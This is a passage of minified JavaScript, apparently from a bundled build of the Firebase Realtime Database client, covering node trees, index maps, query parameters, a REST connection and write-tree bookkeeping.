eF=Math.log(2),op=class{constructor(e){let n=o=>parseInt(Math.log(o)/eF,10),r=o=>parseInt(Array(o+1).join("1"),2);this.count=n(e+1),this.current_=this.count-1;let i=r(this.count);this.bits_=e+1&i}nextBitIsOne(){let e=!(this.bits_&1<<this.current_);return this.current_--,e}},nl=function(t,e,n,r){t.sort(e);let i=function(c,l){let u=l-c,d,h;if(u===0)return null;if(u===1)return d=t[c],h=n?n(d):d,new st(h,d.node,st.BLACK,null,null);{let f=parseInt(u/2,10)+c,g=i(c,f),_=i(f+1,l);return d=t[f],h=n?n(d):d,new st(h,d.node,st.BLACK,g,_)}},o=function(c){let l=null,u=null,d=t.length,h=function(g,_){let C=d-g,R=d;d-=g;let te=i(C+1,R),ne=t[C],_e=n?n(ne):ne;f(new st(_e,ne.node,_,null,te))},f=function(g){l?(l.left=g,l=g):(u=g,l=g)};for(let g=0;g<c.count;++g){let _=c.nextBitIsOne(),C=Math.pow(2,c.count-(g+1));_?h(C,st.BLACK):(h(C,st.BLACK),h(C,st.RED))}return u},s=new op(t.length),a=o(s);return new Ke(r||e,a)};var Vf,Ci={},Ni=class t{constructor(e,n){this.indexes_=e,this.indexSet_=n}static get Default(){return m(Ci&&Ce,"ChildrenNode.ts has not been loaded"),Vf=Vf||new t({".priority":Ci},{".priority":Ce}),Vf}get(e){let n=Xn(this.indexes_,e);if(!n)throw new Error("No index defined for "+e);return n instanceof Ke?n:null}hasIndex(e){return _t(this.indexSet_,e.toString())}addIndex(e,n){m(e!==Si,"KeyIndex always exists and isn't meant to be added to the IndexMap.");let r=[],i=!1,o=n.getIterator(U.Wrap),s=o.getNext();for(;s;)i=i||e.isDefinedOn(s.node),r.push(s),s=o.getNext();let a;i?a=nl(r,e.getCompare()):a=Ci;let c=e.toString(),l=Object.assign({},this.indexSet_);l[c]=e;let u=Object.assign({},this.indexes_);return u[c]=a,new t(u,l)}addToIndexes(e,n){let r=Uo(this.indexes_,(i,o)=>{let s=Xn(this.indexSet_,o);if(m(s,"Missing index implementation for "+o),i===Ci)if(s.isDefinedOn(e.node)){let a=[],c=n.getIterator(U.Wrap),l=c.getNext();for(;l;)l.name!==e.name&&a.push(l),l=c.getNext();return a.push(e),nl(a,s.getCompare())}else return Ci;else{let a=n.get(e.name),c=i;return a&&(c=c.remove(new U(e.name,a))),c.insert(e,e.node)}});return new t(r,this.indexSet_)}removeFromIndexes(e,n){let r=Uo(this.indexes_,i=>{if(i===Ci)return i;{let o=n.get(e.name);return o?i.remove(new U(e.name,o)):i}});return new t(r,this.indexSet_)}};var is,ee=(()=>{class t{constructor(n,r,i){this.children_=n,this.priorityNode_=r,this.indexMap_=i,this.lazyHash_=null,this.priorityNode_&&zE(this.priorityNode_),this.children_.isEmpty()&&m(!this.priorityNode_||this.priorityNode_.isEmpty(),"An empty node cannot have a priority")}static get EMPTY_NODE(){return is||(is=new t(new Ke(Fp),null,Ni.Default))}isLeafNode(){return!1}getPriority(){return this.priorityNode_||is}updatePriority(n){return this.children_.isEmpty()?this:new t(this.children_,n,this.indexMap_)}getImmediateChild(n){if(n===".priority")return this.getPriority();{let r=this.children_.get(n);return r===null?is:r}}getChild(n){let r=F(n);return r===null?this:this.getImmediateChild(r).getChild(X(n))}hasChild(n){return this.children_.get(n)!==null}updateImmediateChild(n,r){if(m(r,"We should always be passing snapshot nodes"),n===".priority")return this.updatePriority(r);{let i=new U(n,r),o,s;r.isEmpty()?(o=this.children_.remove(n),s=this.indexMap_.removeFromIndexes(i,this.children_)):(o=this.children_.insert(n,r),s=this.indexMap_.addToIndexes(i,this.children_));let a=o.isEmpty()?is:this.priorityNode_;return new t(o,a,s)}}updateChild(n,r){let i=F(n);if(i===null)return r;{m(F(n)!==".priority"||Tn(n)===1,".priority must be the last token in a path");let o=this.getImmediateChild(i).updateChild(X(n),r);return this.updateImmediateChild(i,o)}}isEmpty(){return this.children_.isEmpty()}numChildren(){return this.children_.count()}val(n){if(this.isEmpty())return null;let r={},i=0,o=0,s=!0;if(this.forEachChild(Ce,(a,c)=>{r[a]=c.val(n),i++,s&&t.INTEGER_REGEXP_.test(a)?o=Math.max(o,Number(a)):s=!1}),!n&&s&&o<2*i){let a=[];for(let c in r)a[c]=r[c];return a}else return n&&!this.getPriority().isEmpty()&&(r[".priority"]=this.getPriority().val()),r}hash(){if(this.lazyHash_===null){let n="";this.getPriority().isEmpty()||(n+="priority:"+WE(this.getPriority().val())+":"),this.forEachChild(Ce,(r,i)=>{let o=i.hash();o!==""&&(n+=":"+r+":"+o)}),this.lazyHash_=n===""?"":IE(n)}return this.lazyHash_}getPredecessorChildName(n,r,i){let o=this.resolveIndex_(i);if(o){let s=o.getPredecessorKey(new U(n,r));return s?s.name:null}else return this.children_.getPredecessorKey(n)}getFirstChildName(n){let r=this.resolveIndex_(n);if(r){let i=r.minKey();return i&&i.name}else return this.children_.minKey()}getFirstChild(n){let r=this.getFirstChildName(n);return r?new U(r,this.children_.get(r)):null}getLastChildName(n){let r=this.resolveIndex_(n);if(r){let i=r.maxKey();return i&&i.name}else return this.children_.maxKey()}getLastChild(n){let r=this.getLastChildName(n);return r?new U(r,this.children_.get(r)):null}forEachChild(n,r){let i=this.resolveIndex_(n);return i?i.inorderTraversal(o=>r(o.name,o.node)):this.children_.inorderTraversal(r)}getIterator(n){return this.getIteratorFrom(n.minPost(),n)}getIteratorFrom(n,r){let i=this.resolveIndex_(r);if(i)return i.getIteratorFrom(n,o=>o);{let o=this.children_.getIteratorFrom(n.name,U.Wrap),s=o.peek();for(;s!=null&&r.compare(s,n)<0;)o.getNext(),s=o.peek();return o}}getReverseIterator(n){return this.getReverseIteratorFrom(n.maxPost(),n)}getReverseIteratorFrom(n,r){let i=this.resolveIndex_(r);if(i)return i.getReverseIteratorFrom(n,o=>o);{let o=this.children_.getReverseIteratorFrom(n.name,U.Wrap),s=o.peek();for(;s!=null&&r.compare(s,n)>0;)o.getNext(),s=o.peek();return o}}compareTo(n){return this.isEmpty()?n.isEmpty()?0:-1:n.isLeafNode()||n.isEmpty()?1:n===gs?-1:0}withIndex(n){if(n===Si||this.indexMap_.hasIndex(n))return this;{let r=this.indexMap_.addIndex(n,this.children_);return new t(this.children_,this.priorityNode_,r)}}isIndexed(n){return n===Si||this.indexMap_.hasIndex(n)}equals(n){if(n===this)return!0;if(n.isLeafNode())return!1;{let r=n;if(this.getPriority().equals(r.getPriority()))if(this.children_.count()===r.children_.count()){let i=this.getIterator(Ce),o=r.getIterator(Ce),s=i.getNext(),a=o.getNext();for(;s&&a;){if(s.name!==a.name||!s.node.equals(a.node))return!1;s=i.getNext(),a=o.getNext()}return s===null&&a===null}else return!1;else return!1}}resolveIndex_(n){return n===Si?null:this.indexMap_.get(n.toString())}}return t.INTEGER_REGEXP_=/^(0|[1-9]\d*)$/,t})(),sp=class extends ee{constructor(){super(new Ke(Fp),ee.EMPTY_NODE,Ni.Default)}compareTo(e){return e===this?0:1}equals(e){return e===this}getPriority(){return this}getImmediateChild(e){return ee.EMPTY_NODE}isEmpty(){return!1}},gs=new sp;Object.defineProperties(U,{MIN:{value:new U(Ti,ee.EMPTY_NODE)},MAX:{value:new U(fr,gs)}});tl.__EMPTY_NODE=ee.EMPTY_NODE;Mi.__childrenNodeConstructor=ee;Qk(gs);Xk(gs);var tF=!0;function ye(t,e=null){if(t===null)return ee.EMPTY_NODE;if(typeof t=="object"&&".priority"in t&&(e=t[".priority"]),m(e===null||typeof e=="string"||typeof e=="number"||typeof e=="object"&&".sv"in e,"Invalid priority type found: "+typeof e),typeof t=="object"&&".value"in t&&t[".value"]!==null&&(t=t[".value"]),typeof t!="object"||".sv"in t){let n=t;return new Mi(n,ye(e))}if(!(t instanceof Array)&&tF){let n=[],r=!1;if(Ze(t,(s,a)=>{if(s.substring(0,1)!=="."){let c=ye(a);c.isEmpty()||(r=r||!c.getPriority().isEmpty(),n.push(new U(s,c)))}}),n.length===0)return ee.EMPTY_NODE;let o=nl(n,Zk,s=>s.name,Fp);if(r){let s=nl(n,Ce.getCompare());return new ee(o,ye(e),new Ni({".priority":s},{".priority":Ce}))}else return new ee(o,ye(e),Ni.Default)}else{let n=ee.EMPTY_NODE;return Ze(t,(r,i)=>{if(_t(t,r)&&r.substring(0,1)!=="."){let o=ye(i);(o.isLeafNode()||!o.isEmpty())&&(n=n.updateImmediateChild(r,o))}}),n.updatePriority(ye(e))}}Jk(ye);var ap=class extends Ai{constructor(e){super(),this.indexPath_=e,m(!L(e)&&F(e)!==".priority","Can't create PathIndex with empty path or .priority key")}extractChild(e){return e.getChild(this.indexPath_)}isDefinedOn(e){return!e.getChild(this.indexPath_).isEmpty()}compare(e,n){let r=this.extractChild(e.node),i=this.extractChild(n.node),o=r.compareTo(i);return o===0?Oi(e.name,n.name):o}makePost(e,n){let r=ye(e),i=ee.EMPTY_NODE.updateChild(this.indexPath_,r);return new U(n,i)}maxPost(){let e=ee.EMPTY_NODE.updateChild(this.indexPath_,gs);return new U(fr,e)}toString(){return UE(this.indexPath_,0).join("/")}};var cp=class extends Ai{compare(e,n){let r=e.node.compareTo(n.node);return r===0?Oi(e.name,n.name):r}isDefinedOn(e){return!0}indexedValueChanged(e,n){return!e.equals(n)}minPost(){return U.MIN}maxPost(){return U.MAX}makePost(e,n){let r=ye(e);return new U(n,r)}toString(){return".value"}},nF=new cp;function rF(t){return{type:"value",snapshotNode:t}}function iF(t,e){return{type:"child_added",snapshotNode:e,childName:t}}function oF(t,e){return{type:"child_removed",snapshotNode:e,childName:t}}function tE(t,e,n){return{type:"child_changed",snapshotNode:e,childName:t,oldSnap:n}}function sF(t,e){return{type:"child_moved",snapshotNode:e,childName:t}}var lp=class t{constructor(){this.limitSet_=!1,this.startSet_=!1,this.startNameSet_=!1,this.startAfterSet_=!1,this.endSet_=!1,this.endNameSet_=!1,this.endBeforeSet_=!1,this.limit_=0,this.viewFrom_="",this.indexStartValue_=null,this.indexStartName_="",this.indexEndValue_=null,this.indexEndName_="",this.index_=Ce}hasStart(){return this.startSet_}isViewFromLeft(){return this.viewFrom_===""?this.startSet_:this.viewFrom_==="l"}getIndexStartValue(){return m(this.startSet_,"Only valid if start has been set"),this.indexStartValue_}getIndexStartName(){return m(this.startSet_,"Only valid if start has been set"),this.startNameSet_?this.indexStartName_:Ti}hasEnd(){return this.endSet_}getIndexEndValue(){return m(this.endSet_,"Only valid if end has been set"),this.indexEndValue_}getIndexEndName(){return m(this.endSet_,"Only valid if end has been set"),this.endNameSet_?this.indexEndName_:fr}hasLimit(){return this.limitSet_}hasAnchoredLimit(){return this.limitSet_&&this.viewFrom_!==""}getLimit(){return m(this.limitSet_,"Only valid if limit has been set"),this.limit_}getIndex(){return this.index_}loadsAllData(){return!(this.startSet_||this.endSet_||this.limitSet_)}isDefault(){return this.loadsAllData()&&this.index_===Ce}copy(){let e=new t;return e.limitSet_=this.limitSet_,e.limit_=this.limit_,e.startSet_=this.startSet_,e.startAfterSet_=this.startAfterSet_,e.indexStartValue_=this.indexStartValue_,e.startNameSet_=this.startNameSet_,e.indexStartName_=this.indexStartName_,e.endSet_=this.endSet_,e.endBeforeSet_=this.endBeforeSet_,e.indexEndValue_=this.indexEndValue_,e.endNameSet_=this.endNameSet_,e.indexEndName_=this.indexEndName_,e.index_=this.index_,e.viewFrom_=this.viewFrom_,e}};function nE(t){let e={};if(t.isDefault())return e;let n;if(t.index_===Ce?n="$priority":t.index_===nF?n="$value":t.index_===Si?n="$key":(m(t.index_ instanceof ap,"Unrecognized index type!"),n=t.index_.toString()),e.orderBy=he(n),t.startSet_){let r=t.startAfterSet_?"startAfter":"startAt";e[r]=he(t.indexStartValue_),t.startNameSet_&&(e[r]+=","+he(t.indexStartName_))}if(t.endSet_){let r=t.endBeforeSet_?"endBefore":"endAt";e[r]=he(t.indexEndValue_),t.endNameSet_&&(e[r]+=","+he(t.indexEndName_))}return t.limitSet_&&(t.isViewFromLeft()?e.limitToFirst=t.limit_:e.limitToLast=t.limit_),e}function rE(t){let e={};if(t.startSet_&&(e.sp=t.indexStartValue_,t.startNameSet_&&(e.sn=t.indexStartName_),e.sin=!t.startAfterSet_),t.endSet_&&(e.ep=t.indexEndValue_,t.endNameSet_&&(e.en=t.indexEndName_),e.ein=!t.endBeforeSet_),t.limitSet_){e.l=t.limit_;let n=t.viewFrom_;n===""&&(t.isViewFromLeft()?n="l":n="r"),e.vf=n}return t.index_!==Ce&&(e.i=t.index_.toString()),e}var up=class t extends Jc{constructor(e,n,r,i){super(),this.repoInfo_=e,this.onDataUpdate_=n,this.authTokenProvider_=r,this.appCheckTokenProvider_=i,this.log_=ps("p:rest:"),this.listens_={}}reportStats(e){throw new Error("Method not implemented.")}static getListenId_(e,n){return n!==void 0?"tag$"+n:(m(e._queryParams.isDefault(),"should have a tag if it's not a default query."),e._path.toString())}listen(e,n,r,i){let o=e._path.toString();this.log_("Listen called for "+o+" "+e._queryIdentifier);let s=t.getListenId_(e,r),a={};this.listens_[s]=a;let c=nE(e._queryParams);this.restRequest_(o+".json",c,(l,u)=>{let d=u;if(l===404&&(d=null,l=null),l===null&&this.onDataUpdate_(o,d,!1,r),Xn(this.listens_,s)===a){let h;l?l===401?h="permission_denied":h="rest_error:"+l:h="ok",i(h,null)}})}unlisten(e,n){let r=t.getListenId_(e,n);delete this.listens_[r]}get(e){let n=nE(e._queryParams),r=e._path.toString(),i=new yn;return this.restRequest_(r+".json",n,(o,s)=>{let a=s;o===404&&(a=null,o=null),o===null?(this.onDataUpdate_(r,a,!1,null),i.resolve(a)):i.reject(new Error(a))}),i.promise}refreshAuthToken(e){}restRequest_(e,n={},r){return n.format="export",Promise.all([this.authTokenProvider_.getToken(!1),this.appCheckTokenProvider_.getToken(!1)]).then(([i,o])=>{i&&i.accessToken&&(n.auth=i.accessToken),o&&o.token&&(n.ac=o.token);let s=(this.repoInfo_.secure?"https://":"http://")+this.repoInfo_.host+e+"?ns="+this.repoInfo_.namespace+er(n);this.log_("Sending REST request for "+s);let a=new XMLHttpRequest;a.onreadystatechange=()=>{if(r&&a.readyState===4){this.log_("REST Response for "+s+" received. status:",a.status,"response:",a.responseText);let c=null;if(a.status>=200&&a.status<300){try{c=gi(a.responseText)}catch{Oe("Failed to parse JSON response for "+s+": "+a.responseText)}r(null,c)}else a.status!==401&&a.status!==404&&Oe("Got unsuccessful REST response for "+s+" Status: "+a.status),r(a.status);r=null}},a.open("GET",s,!0),a.send()})}};var dp=class{constructor(){this.rootNode_=ee.EMPTY_NODE}getNode(e){return this.rootNode_.getChild(e)}updateSnapshot(e,n){this.rootNode_=this.rootNode_.updateChild(e,n)}};function rl(){return{value:null,children:new Map}}function YE(t,e,n){if(L(e))t.value=n,t.children.clear();else if(t.value!==null)t.value=t.value.updateChild(e,n);else{let r=F(e);t.children.has(r)||t.children.set(r,rl());let i=t.children.get(r);e=X(e),YE(i,e,n)}}function hp(t,e,n){t.value!==null?n(e,t.value):aF(t,(r,i)=>{let o=new Q(e.toString()+"/"+r);hp(i,o,n)})}function aF(t,e){t.children.forEach((n,r)=>{e(r,n)})}var fp=class{constructor(e){this.collection_=e,this.last_=null}get(){let e=this.collection_.get(),n=Object.assign({},e);return this.last_&&Ze(this.last_,(r,i)=>{n[r]=n[r]-i}),this.last_=e,n}};var iE=10*1e3,cF=30*1e3,lF=5*60*1e3,pp=class{constructor(e,n){this.server_=n,this.statsToReport_={},this.statsListener_=new fp(e);let r=iE+(cF-iE)*Math.random();ss(this.reportStats_.bind(this),Math.floor(r))}reportStats_(){let e=this.statsListener_.get(),n={},r=!1;Ze(e,(i,o)=>{o>0&&_t(this.statsToReport_,i)&&(n[i]=o,r=!0)}),r&&this.server_.reportStats(n),ss(this.reportStats_.bind(this),Math.floor(Math.random()*2*lF))}};var Yt=function(t){return t[t.OVERWRITE=0]="OVERWRITE",t[t.MERGE=1]="MERGE",t[t.ACK_USER_WRITE=2]="ACK_USER_WRITE",t[t.LISTEN_COMPLETE=3]="LISTEN_COMPLETE",t}(Yt||{});function KE(){return{fromUser:!0,fromServer:!1,queryId:null,tagged:!1}}function ZE(){return{fromUser:!1,fromServer:!0,queryId:null,tagged:!1}}function QE(t){return{fromUser:!1,fromServer:!0,queryId:t,tagged:!0}}var gp=class t{constructor(e,n,r){this.path=e,this.affectedTree=n,this.revert=r,this.type=Yt.ACK_USER_WRITE,this.source=KE()}operationForChild(e){if(L(this.path)){if(this.affectedTree.value!=null)return m(this.affectedTree.children.isEmpty(),"affectedTree should not have overlapping affected paths."),this;{let n=this.affectedTree.subtree(new Q(e));return new t(K(),n,this.revert)}}else return m(F(this.path)===e,"operationForChild called for unrelated child."),new t(X(this.path),this.affectedTree,this.revert)}};var Ri=class t{constructor(e,n,r){this.source=e,this.path=n,this.snap=r,this.type=Yt.OVERWRITE}operationForChild(e){return L(this.path)?new t(this.source,K(),this.snap.getImmediateChild(e)):new t(this.source,X(this.path),this.snap)}};var il=class t{constructor(e,n,r){this.source=e,this.path=n,this.children=r,this.type=Yt.MERGE}operationForChild(e){if(L(this.path)){let n=this.children.subtree(new Q(e));return n.isEmpty()?null:n.value?new Ri(this.source,K(),n.value):new t(this.source,K(),n)}else return m(F(this.path)===e,"Can't get a merge for a child not on the path of the operation"),new t(this.source,X(this.path),this.children)}toString(){return"Operation("+this.path+": "+this.source.toString()+" merge: "+this.children.toString()+")"}};var us=class{constructor(e,n,r){this.node_=e,this.fullyInitialized_=n,this.filtered_=r}isFullyInitialized(){return this.fullyInitialized_}isFiltered(){return this.filtered_}isCompleteForPath(e){if(L(e))return this.isFullyInitialized()&&!this.filtered_;let n=F(e);return this.isCompleteForChild(n)}isCompleteForChild(e){return this.isFullyInitialized()&&!this.filtered_||this.node_.hasChild(e)}getNode(){return this.node_}};function uF(t,e,n,r){let i=[],o=[];return e.forEach(s=>{s.type==="child_changed"&&t.index_.indexedValueChanged(s.oldSnap,s.snapshotNode)&&o.push(sF(s.childName,s.snapshotNode))}),os(t,i,"child_removed",e,r,n),os(t,i,"child_added",e,r,n),os(t,i,"child_moved",o,r,n),os(t,i,"child_changed",e,r,n),os(t,i,"value",e,r,n),i}function os(t,e,n,r,i,o){let s=r.filter(a=>a.type===n);s.sort((a,c)=>hF(t,a,c)),s.forEach(a=>{let c=dF(t,a,o);i.forEach(l=>{l.respondsTo(a.type)&&e.push(l.createEvent(c,t.query_))})})}function dF(t,e,n){return e.type==="value"||e.type==="child_removed"||(e.prevName=n.getPredecessorChildName(e.childName,e.snapshotNode,t.index_)),e}function hF(t,e,n){if(e.childName==null||n.childName==null)throw Jn("Should only compare child_ events.");let r=new U(e.childName,e.snapshotNode),i=new U(n.childName,n.snapshotNode);return t.index_.compare(r,i)}function JE(t,e){return{eventCache:t,serverCache:e}}function cs(t,e,n,r){return JE(new us(e,n,r),t.serverCache)}function XE(t,e,n,r){return JE(t.eventCache,new us(e,n,r))}function mp(t){return t.eventCache.isFullyInitialized()?t.eventCache.getNode():null}function pr(t){return t.serverCache.isFullyInitialized()?t.serverCache.getNode():null}var jf,fF=()=>(jf||(jf=new Ke(fk)),jf),Pe=class t{constructor(e,n=fF()){this.value=e,this.children=n}static fromObject(e){let n=new t(null);return Ze(e,(r,i)=>{n=n.set(new Q(r),i)}),n}isEmpty(){return this.value===null&&this.children.isEmpty()}findRootMostMatchingPathAndValue(e,n){if(this.value!=null&&n(this.value))return{path:K(),value:this.value};if(L(e))return null;{let r=F(e),i=this.children.get(r);if(i!==null){let o=i.findRootMostMatchingPathAndValue(X(e),n);return o!=null?{path:de(new Q(r),o.path),value:o.value}:null}else return null}}findRootMostValueAndPath(e){return this.findRootMostMatchingPathAndValue(e,()=>!0)}subtree(e){if(L(e))return this;{let n=F(e),r=this.children.get(n);return r!==null?r.subtree(X(e)):new t(null)}}set(e,n){if(L(e))return new t(n,this.children);{let r=F(e),o=(this.children.get(r)||new t(null)).set(X(e),n),s=this.children.insert(r,o);return new t(this.value,s)}}remove(e){if(L(e))return this.children.isEmpty()?new t(null):new t(null,this.children);{let n=F(e),r=this.children.get(n);if(r){let i=r.remove(X(e)),o;return i.isEmpty()?o=this.children.remove(n):o=this.children.insert(n,i),this.value===null&&o.isEmpty()?new t(null):new t(this.value,o)}else return this}}get(e){if(L(e))return this.value;{let n=F(e),r=this.children.get(n);return r?r.get(X(e)):null}}setTree(e,n){if(L(e))return n;{let r=F(e),o=(this.children.get(r)||new t(null)).setTree(X(e),n),s;return o.isEmpty()?s=this.children.remove(r):s=this.children.insert(r,o),new t(this.value,s)}}fold(e){return this.fold_(K(),e)}fold_(e,n){let r={};return this.children.inorderTraversal((i,o)=>{r[i]=o.fold_(de(e,i),n)}),n(e,this.value,r)}findOnPath(e,n){return this.findOnPath_(e,K(),n)}findOnPath_(e,n,r){let i=this.value?r(n,this.value):!1;if(i)return i;if(L(e))return null;{let o=F(e),s=this.children.get(o);return s?s.findOnPath_(X(e),de(n,o),r):null}}foreachOnPath(e,n){return this.foreachOnPath_(e,K(),n)}foreachOnPath_(e,n,r){if(L(e))return this;{this.value&&r(n,this.value);let i=F(e),o=this.children.get(i);return o?o.foreachOnPath_(X(e),de(n,i),r):new t(null)}}foreach(e){this.foreach_(K(),e)}foreach_(e,n){this.children.inorderTraversal((r,i)=>{i.foreach_(de(e,r),n)}),this.value&&n(e,this.value)}foreachChild(e){this.children.inorderTraversal((n,r)=>{r.value&&e(n,r.value)})}};var ct=class t{constructor(e){this.writeTree_=e}static empty(){return new t(new Pe(null))}};function ls(t,e,n){if(L(e))return new ct(new Pe(n));{let r=t.writeTree_.findRootMostValueAndPath(e);if(r!=null){let i=r.path,o=r.value,s=Ye(i,e);return o=o.updateChild(s,n),new ct(t.writeTree_.set(i,o))}else{let i=new Pe(n),o=t.writeTree_.setTree(e,i);return new ct(o)}}}function oE(t,e,n){let r=t;return Ze(n,(i,o)=>{r=ls(r,de(e,i),o)}),r}function sE(t,e){if(L(e))return ct.empty();{let n=t.writeTree_.setTree(e,new Pe(null));return new ct(n)}}function vp(t,e){return mr(t,e)!=null}function mr(t,e){let n=t.writeTree_.findRootMostValueAndPath(e);return n!=null?t.writeTree_.get(n.path).getChild(Ye(n.path,e)):null}function aE(t){let e=[],n=t.writeTree_.value;return n!=null?n.isLeafNode()||n.forEachChild(Ce,(r,i)=>{e.push(new U(r,i))}):t.writeTree_.children.inorderTraversal((r,i)=>{i.value!=null&&e.push(new U(r,i.value))}),e}function Sn(t,e){if(L(e))return t;{let n=mr(t,e);return n!=null?new ct(new Pe(n)):new ct(t.writeTree_.subtree(e))}}function yp(t){return t.writeTree_.isEmpty()}function xi(t,e){return eC(K(),t.writeTree_,e)}function eC(t,e,n){if(e.value!=null)return n.updateChild(t,e.value);{let r=null;return e.children.inorderTraversal((i,o)=>{i===".priority"?(m(o.value!==null,"Priority writes must always be leaf nodes"),r=o.value):n=eC(de(t,i),o,n)}),!n.getChild(t).isEmpty()&&r!==null&&(n=n.updateChild(de(t,".priority"),r)),n}}function tC(t,e){return sC(e,t)}function pF(t,e,n,r,i){m(r>t.lastWriteId,"Stacking an older write on top of newer ones"),i===void 0&&(i=!0),t.allWrites.push({path:e,snap:n,writeId:r,visible:i}),i&&(t.visibleWrites=ls(t.visibleWrites,e,n)),t.lastWriteId=r}function gF(t,e){for(let n=0;n<t.allWrites.length;n++){let r=t.allWrites[n];if(r.writeId===e)return r}return null}function mF(t,e){let n=t.allWrites.findIndex(a=>a.writeId===e);m(n>=0,"removeWrite called with nonexistent writeId.");let r=t.allWrites[n];t.allWrites.splice(n,1);let i=r.visible,o=!1,s=t.allWrites.length-1;for(;i&&s>=0;){let a=t.allWrites[s];a.visible&&(s>=n&&vF(a,r.path)?i=!1:at(r.path,a.path)&&(o=!0)),s--}if(i){if(o)return yF(t),!0;if(r.snap)t.visibleWrites=sE(t.visibleWrites,r.path);else{let a=r.children;Ze(a,c=>{t.visibleWrites=sE(t.visibleWrites,de(r.path,c))})}return!0}else return!1}function vF(t,e){if(t.snap)return at(t.path,e);for(let n in t.children)if(t.children.hasOwnProperty(n)&&at(de(t.path,n),e))return!0;return!1}function yF(t){t.visibleWrites=nC(t.allWrites,_F,K()),t.allWrites.length>0?t.lastWriteId=t.allWrites[t.allWrites.length-1].writeId:t.lastWriteId=-1}function _F(t){return t.visible}function nC(t,e,n){let r=ct.empty();for(let i=0;i<t.length;++i){let o=t[i];if(e(o)){let s=o.path,a;if(o.snap)at(n,s)?(a=Ye(n,s),r=ls(r,a,o.snap)):at(s,n)&&(a=Ye(s,n),r=ls(r,K(),o.snap.getChild(a)));else if(o.children){if(at(n,s))a=Ye(n,s),r=oE(r,a,o.children);else if(at(s,n))if(a=Ye(s,n),L(a))r=oE(r,K(),o.children);else{let c=Xn(o.children,F(a));if(c){let l=c.getChild(X(a));r=ls(r,K(),l)}}}else throw Jn("WriteRecord should have .snap or .children")}}return r}function rC(t,e,n,r,i){if(!r&&!i){let o=mr(t.visibleWrites,e);if(o!=null)return o;{let s=Sn(t.visibleWrites,e);if(yp(s))return n;if(n==null&&!vp(s,K()))return null;{let a=n||ee.EMPTY_NODE;return xi(s,a)}}}else{let o=Sn(t.visibleWrites,e);if(!i&&yp(o))return n;if(!i&&n==null&&!vp(o,K()))return null;{let s=function(l){return(l.visible||i)&&(!r||!~r.indexOf(l.writeId))&&(at(l.path,e)||at(e,l.path))},a=nC(t.allWrites,s,e),c=n||ee.EMPTY_NODE;return xi(a,c)}}}function IF(t,e,n){let r=ee.EMPTY_NODE,i=mr(t.visibleWrites,e);if(i)return i.isLeafNode()||i.forEachChild(Ce,(o,s)=>{r=r.updateImmediateChild(o,s)}),r;if(n){let o=Sn(t.visibleWrites,e);return n.forEachChild(Ce,(s,a)=>{let c=xi(Sn(o,new Q(s)),a);r=r.updateImmediateChild(s,c)}),aE(o).forEach(s=>{r=r.updateImmediateChild(s.name,s.node)}),r}else{let o=Sn(t.visibleWrites,e);return aE(o).forEach(s=>{r=r.updateImmediateChild(s.name,s.node)}),r}}function wF(t,e,n,r,i){m(r||i,"Either existingEventSnap or existingServerSnap must exist");let o=de(e,n);if(vp(t.visibleWrites,o))return null;{let s=Sn(t.visibleWrites,o);return yp(s)?i.getChild(n):xi(s,i.getChild(n))}}function EF(t,e,n,r){let i=de(e,n),o=mr(t.visibleWrites,i);if(o!=null)return o;if(r.isCompleteForChild(n)){let s=Sn(t.visibleWrites,i);return xi(s,r.getNode().getImmediateChild(n))}else return null}function CF(t,e){return mr(t.visibleWrites,e)}function DF(t,e,n,r,i,o,s){let a,c=Sn(t.visibleWrites,e),l=mr(c,K());if(l!=null)a=l;else if(n!=null)a=xi(c,n);else return[];if(a=a.withIndex(s),!a.isEmpty()&&!a.isLeafNode()){let u=[],d=s.getCompare(),h=o?a.getReverseIteratorFrom(r,s):a.getIteratorFrom(r,s),f=h.getNext();for(;f&&u.length<i;)d(f,r)!==0&&u.push(f),f=h.getNext();return u}else return[]}function bF(){return{visibleWrites:ct.empty(),allWrites:[],lastWriteId:-1}}function _p(t,e,n,r){return rC(t.writeTree,t.treePath,e,n,r)}function iC(t,e){return IF(t.writeTree,t.treePath,e)}function cE(t,e,n,r){return wF(t.writeTree,t.treePath,e,n,r)}function ol(t,e){return CF(t.writeTree,de(t.treePath,e))}function SF(t,e,n,r,i,o){return DF(t.writeTree,t.treePath,e,n,r,i,o)}function Lp(t,e,n){return EF(t.writeTree,t.treePath,e,n)}function oC(t,e){return sC(de(t.treePath,e),t.writeTree)}function sC(t,e){return{treePath:t,writeTree:e}}var Ip=class{constructor(){this.changeMap=new Map}trackChildChange(e){let n=e.type,r=e.childName;m(n==="child_added"||n==="child_changed"||n==="child_removed","Only child changes supported for tracking"),m(r!==".priority","Only non-priority child changes can be tracked.");let i=this.changeMap.get(r);if(i){let o=i.type;if(n==="child_added"&&o==="child_removed")this.changeMap.set(r,tE(r,e.snapshotNode,i.snapshotNode));else if(n==="child_removed"&&o==="child_added")this.changeMap.delete(r);else if(n==="child_removed"&&o==="child_changed")this.changeMap.set(r,oF(r,i.oldSnap));else if(n==="child_changed"&&o==="child_added")this.changeMap.set(r,iF(r,e.snapshotNode));else if(n==="child_changed"&&o==="child_changed")this.changeMap.set(r,tE(r,e.snapshotNode,i.oldSnap));else throw Jn("Illegal combination of changes: "+e+" occurred after "+i)}else this.changeMap.set(r,e)}getChanges(){return Array.from(this.changeMap.values())}};var wp=class{getCompleteChild(e){return null}getChildAfterChild(e,n,r){return null}},aC=new wp,ds=class{constructor(e,n,r=null){this.writes_=e,this.viewCache_=n,this.optCompleteServerCache_=r}getCompleteChild(e){let n=this.viewCache_.eventCache;if(n.isCompleteForChild(e))return n.getNode().getImmediateChild(e);{let r=this.optCompleteServerCache_!=null?new us(this.optCompleteServerCache_,!0,!1):this.viewCache_.serverCache;return Lp(this.writes_,e,r)}}getChildAfterChild(e,n,r){let i=this.optCompleteServerCache_!=null?this.optCompleteServerCache_:pr(this.viewCache_),o=SF(this.writes_,i,n,1,r,e);return o.length===0?null:o[0]}};function TF(t,e){m(e.eventCache.getNode().isIndexed(t.filter.getIndex()),"Event snap not indexed"),m(e.serverCache.getNode().isIndexed(t.filter.getIndex()),"Server snap not indexed")}function AF(t,e,n,r,i){let o=new Ip,s,a;if(n.type===Yt.OVERWRITE){let l=n;l.source.fromUser?s=Ep(t,e,l.path,l.snap,r,i,o):(m(l.source.fromServer,"Unknown source."),a=l.source.tagged||e.serverCache.isFiltered()&&!L(l.path),s=sl(t,e,l.path,l.snap,r,i,a,o))}else if(n.type===Yt.MERGE){let l=n;l.source.fromUser?s=NF(t,e,l.path,l.children,r,i,o):(m(l.source.fromServer,"Unknown 